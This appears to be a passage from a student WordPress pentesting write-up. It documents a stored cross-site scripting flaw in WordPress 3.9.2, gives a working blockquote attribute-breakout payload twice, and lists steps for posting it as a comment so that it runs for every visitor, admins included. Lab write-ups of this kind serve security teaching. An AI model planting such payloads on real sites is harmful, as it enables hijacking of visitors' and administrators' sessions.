    [<blockquote cite="]">[" onmouseover="this.style.display='none';alert('exploit javascript running');" style="position:fixed;left:0px;top:0px;width:100%;height:100%;z-index:10000;display:block" ]

  - [ ] GIF Walkthrough: [gif](https://github.com/jsska20/Project_7-WordPress_Pentesting/blob/master/Stored_XSS_WP_3.9.2.gif)
  - [ ] Steps to recreate:    
Go to a comment section of a post 
Enter fake required fields to make a comment 
Enter the following comment:
  [<blockquote cite="]">[" onmouseover="this.style.display='none';alert('exploit javascript running');" style="position:fixed;left:0px;top:0px;width:100%;height:100%;z-index:10000;display:block" ]
And that should create a persistent XSS injection, which will be executed every time someone requests a page where that comment is present, even on the admin console.
